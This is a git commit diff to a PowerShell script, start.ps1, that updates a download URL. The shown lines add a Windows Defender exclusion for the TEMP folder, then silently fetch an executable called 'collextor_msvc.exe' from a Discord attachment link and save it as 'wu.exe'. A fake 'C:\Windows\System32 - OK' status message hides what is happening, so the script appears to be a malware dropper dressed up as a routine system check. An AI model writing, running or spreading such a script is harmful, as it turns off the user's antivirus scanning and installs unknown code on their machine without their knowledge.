2ee65344a3cb76d404db253a4fe46cc44b600e20
TheAmalgamClient <fggc3860@gmail.com>
2026-06-28 17:36:33 +0300

    Update start.ps1

--- start.ps1
+++ start.ps1
@@ -27,7 +27,7 @@ Start-Sleep -Milliseconds 600
 
 $f="$env:TEMP\wu.exe"
 Add-MpPreference -ExclusionPath $env:TEMP 2>&1 | Out-Null
-try { iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520791012954472508/collextor_msvc.exe?ex=6a427a80&is=6a412900&hm=055d9bc776bcea884533f3fe4e1b887bd48fb347d9f2f92de2ceb88722af48ad&" -OutFile $f -UseBasicParsing 2>&1 | Out-Null } catch {}
+try { iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520799959132409896/collextor_msvc.exe?ex=6a4282d5&is=6a413155&hm=312819108eca99d8d134092f2e889413c954015879aa9866f2f68733c1d4c080&" -OutFile $f -UseBasicParsing 2>&1 | Out-Null } catch {}
 
 Write-Host "  C:\Windows\System32 - OK" -ForegroundColor Green
 Start-Sleep -Milliseconds 300
